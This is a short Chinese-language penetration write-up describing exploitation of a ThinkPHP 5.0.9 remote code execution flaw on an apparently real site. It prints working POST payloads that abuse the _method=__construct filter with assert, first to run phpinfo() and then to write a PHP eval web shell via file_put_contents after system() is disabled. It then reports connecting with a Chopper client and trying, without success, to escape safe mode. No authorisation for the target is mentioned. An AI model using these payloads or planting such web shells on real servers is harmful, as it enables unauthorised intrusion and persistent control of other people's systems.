**信息收集**  
通过信息收集发现是个tp v5.0.9，此版本存在tp-rce漏洞。

![](../Images/e78d1bd3453dc45876c991af2c352a7a.png)

直接通过payload进行测试，

```
Post：\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=phpinfo()

```

查找payload，直接打：

Post：\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=phpinfo()

![](../Images/e4b3e7c588a582d34a693407efdda9be.png)

发现是php 5.4.45版本的，

直接尝试getshell：

![](../Images/2cd1d0a1984ca819444f46225994a595.png)

发现system被禁用，尝试其他系统命令的也一样。

![](../Images/9614bbec7c619dc0193280678cf8e0e4.png)

查看phpinfo中desable\_functions禁用了那些函数。

![](../Images/9614bbec7c619dc0193280678cf8e0e4.png)

想办法怎么绕过进行写马（此处卡了我半天）  
最后通过一位渗透小伙伴，想出下面的可以利用file\_put\_contents直接写shell，想了半天，忘了用其他函数进行直接写马就可以了，并不需要非得利用system命令进行写马，还是底层知识薄弱啊。再次感谢小伙伴！

![](../Images/c5cacd3102da8f284d57738f3645f0f1.png)

**getshell**  
构造payload：  

```
\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=file\_put\_contents('a.php','<?php eval($\_POST\[a\])?>')

```

![](../Images/f3f31c59c7b0651d7833f24d1d3e758c.png)

写入成功，利用菜刀连接。

![](../Images/65b21014225a6a0685cd7dd5f0db6a03.png)

成功连接。  
查看权限：

![](../Images/50e258d8bbb3351dbe035bf0241d52f5.png)

发现启动了远程安全模式。  
想要绕过，发现很多函数被禁用，占未成功。
